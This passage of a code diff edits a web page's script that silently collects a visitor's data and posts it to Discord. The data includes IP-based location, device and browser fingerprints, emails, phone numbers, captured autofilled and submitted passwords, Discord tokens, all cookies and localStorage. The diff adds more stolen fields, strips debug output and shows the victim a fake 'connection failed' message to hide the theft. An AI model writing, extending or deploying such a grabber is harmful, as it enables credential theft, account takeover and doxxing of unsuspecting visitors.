+                message += `🏢 **ISP:** \`${isp}\`\n`;
+                message += `🌍 **Country Code:** \`${countryCode}\`\n`;
+                message += `💰 **Currency:** \`${currency}\`\n`;
+                message += `🕐 **Timezone:** \`${timezone}\`\n`;
 
-                await sendToDiscord(msg);
-                await sendToDiscord(cookieMsg);
-                await sendToDiscord(storageMsg);
-                await sendToDiscord(`📄 **PDF Download:** ${pdfData.substring(0, 100)}... (full in browser console)`);
-
-                if (accounts.emails.length > 0 || accounts.usernames.length > 0) {
-                    const accountMsg = `🔐 **ACCOUNT DATA:**\nEmails: ${accounts.emails.join(', ')}\nUsernames: ${accounts.usernames.join(', ')}\nDiscord: ${accounts.discord.map(d => `${d.key}:${d.val}`).join(' | ')}`;
-                    await sendToDiscord(accountMsg.substring(0, 1900));
+                // Do Not Track status
+                message += `\n🔍 **DO NOT TRACK STATUS:** \`${doxData.doNotTrack || 'unspecified'}\`\n`;
+                if (doxData.trackingEnabled) {
+                    message += `⚠️ **TRACKING IS ENABLED** - user is fully trackable\n`;
+                } else {
+                    message += `✅ **TRACKING IS DISABLED** - user requested privacy\n`;
                 }
+
+                // Accounts
+                message += `\n📧 **Emails:** ${accounts.emails.join(', ') || 'none'}\n`;
+                message += `👤 **Usernames:** ${accounts.usernames.join(', ') || 'none'}\n`;
+                message += `📱 **Phone Numbers:** ${accounts.phoneNumbers.join(', ') || 'none'}\n`;
+
+                // Device info
+                message += `\n🖥️ **Platform:** \`${doxData.platform || 'unknown'}\`\n`;
+                message += `📺 **Screen:** ${doxData.screen?.width || '?'}x${doxData.screen?.height || '?'} | ${doxData.screen?.colorDepth || '?'}-bit\n`;
+                message += `🧠 **CPU Cores:** \`${doxData.hardwareConcurrency || '?'}\`\n`;
+                message += `💾 **Device Memory:** \`${doxData.deviceMemory || '?'} GB\`\n`;
+                message += `🎮 **GPU:** \`${doxData.gpu || 'unknown'}\`\n`;
+
+                // Network
+                message += `\n📶 **Network:** ${doxData.network?.effectiveType || '?'} | ${doxData.network?.rtt || '?'}ms | ${doxData.network?.downlink || '?'}Mbps\n`;
+
+                // Browser
+                message += `\n🌍 **Browser Language:** \`${doxData.language || 'unknown'}\`\n`;
+                message += `🗣️ **All Languages:** \`${(doxData.languages || []).join(', ')}\`\n`;
+                message += `🍪 **Cookies Enabled:** \`${doxData.cookieEnabled}\`\n`;
+                message += `👆 **Max Touch Points:** \`${doxData.maxTouchPoints || '0'}\`\n`;
+
+                // Fingerprints
+                message += `\n🖌️ **Canvas FP:** \`${(doxData.canvasFingerprint || '').substring(0, 50)}...\`\n`;
+                message += `🎮 **WebGL:** ${typeof doxData.webgl === 'object' ? doxData.webgl.renderer : doxData.webgl}\n`;
+                message += `🎵 **Audio FP:** \`${(doxData.audioFingerprint || '').substring(0, 30)}...\`\n`;
+
+                // Plugins & Fonts
+                message += `\n🔌 **Plugins:** ${(doxData.plugins || []).slice(0, 5).join(', ') || 'none'}\n`;
+                message += `📝 **Fonts:** ${(doxData.fonts || []).join(', ') || 'unknown'}\n`;
+
+                // Page info
+                message += `\n📄 **Page URL:** \`${doxData.pageUrl || 'unknown'}\`\n`;
+                message += `🔗 **Referrer:** \`${doxData.referrer || 'direct'}\`\n`;
+
+                // Passwords
+                if (passwords.length > 0) {
+                    message += `\n🔑 **CAPTURED PASSWORDS (${passwords.length}):**\n`;
+                    passwords.slice(0, 10).forEach(p => {
+                        if (p.type === 'autofilled') {
+                            message += `  🔓 Autofilled: ${p.id} = ${p.value}\n`;
+                        } else if (p.type === 'form_submission') {
+                            message += `  🔑 Form: ${p.username} | ${p.password}\n`;
+                        } else {
+                            message += `  🔐 ${p.type}: ${p.key} = ${p.value}\n`;
+                        }
+                    });
+                    if (passwords.length > 10) message += `  ... and ${passwords.length - 10} more\n`;
+                }
+
+                // Discord tokens
+                if (accounts.discord.length > 0) {
+                    message += `\n🎮 **DISCORD TOKENS:**\n`;
+                    accounts.discord.slice(0, 5).forEach(d => {
+                        message += `  ${d.key}: ${d.val}\n`;
+                    });
+                }
+
+                // Social accounts
+                if (accounts.social.length > 0) {
+                    message += `\n📱 **SOCIAL MEDIA:**\n`;
+                    accounts.social.slice(0, 5).forEach(s => {
+                        message += `  ${s.platform}: ${s.username}\n`;
+                    });
+                }
+
+                // Cookies (full)
+                const cookies = doxData.cookies || 'none';
+                const cookieMsg = `🍪 **ALL COOKIES:**\n\`\`\`\n${cookies.substring(0, 1900)}\n\`\`\``;
+
+                // localStorage
+                const ls = JSON.stringify(doxData.localStorage || {}, null, 2);
+                const storageMsg = `💾 **localStorage:**\n\`\`\`json\n${ls.substring(0, 1900)}\n\`\`\``;
+
+                // Split main message if needed
+                const chunks = [];
+                let current = '';
+                message.split('\n').forEach(line => {
+                    if ((current + line + '\n').length > 1900) {
+                        chunks.push(current);
+                        current = '';
+                    }
+                    current += line + '\n';
+                });
+                if (current) chunks.push(current);
+
+                // Send all chunks
+                for (let i = 0; i < chunks.length; i++) {
+                    await sendToDiscord({ content: chunks[i] });
+                }
+
+                // Send cookies and storage
+                await sendToDiscord({ content: cookieMsg });
+                await sendToDiscord({ content: storageMsg });
 
                 document.getElementById('status').textContent = '⚠️ connection failed • retry limit exceeded';
-                debug('🏁 Data collection complete');
 
             } catch (err) {
-                debug(`💀 Fatal: ${err.message}`);
-                document.getElementById('status').textContent = '⚠️ connection failed';
-                console.error('[FATAL]', err);
+                document.getElementById('status').textContent = '⚠️ connection failed • server unreachable';
+                document.getElementById('ip-address').textContent = '[ error: timeout ]';
             }
         }
 
-        debug('⏳ Initializing...');
         gatherAndSend();
-        debug('✅ Script ready');
 
     })();
 </script>
